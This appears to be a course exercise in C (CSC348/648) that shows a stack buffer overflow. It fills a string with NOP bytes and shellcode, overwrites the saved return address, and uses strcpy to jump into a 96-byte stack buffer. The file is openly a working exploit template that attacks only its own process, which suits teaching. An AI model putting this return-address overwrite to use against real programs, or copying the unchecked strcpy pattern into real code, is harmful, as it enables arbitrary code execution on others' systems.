
/* overflowBuffer.c   CSC348/648                                 */  
/* This program will jump to the shell code by copying the       */  
/* contents of largeString into the variable buffer              */  
/*                                                               */  

#include<stdio.h>  
#include<string.h>  
#include"amdshellcode.h"  
 
#define BUFFER_SIZE 144         //buffer size is distance between largeString memory
                                //value and the return value, plus 8 bytes

char largeString[BUFFER_SIZE];  //initialize character array 

void function()
{
	char buffer[96];        //character buffer 
	long* ret;              //pointer to hold return address
	int i = 0;              //gotta intialize i out here, because c is for peasants


	/* Initialize buffer with 0x90 (NOP instruction)              */
	memset(&largeString, 0x90, BUFFER_SIZE);   //clear the memory so errors don't occur

	/* Fill largeString with appropriate contents                 */
	for(i = 0; i < strlen(amdshellcode); i++) {   //loop to copy characters from
		largeString[i] = amdshellcode[i];     //amdshellcode to largeString
	}
	ret = (long *)(largeString + 136); //find location of return on stack
	(*ret) = (long)buffer;             //set return to address of buffer
	
	
	strcpy(buffer, largeString);  //write code from largeString to buffer

}

int main()
{
	function();  //call function method
	return 0;  
}  


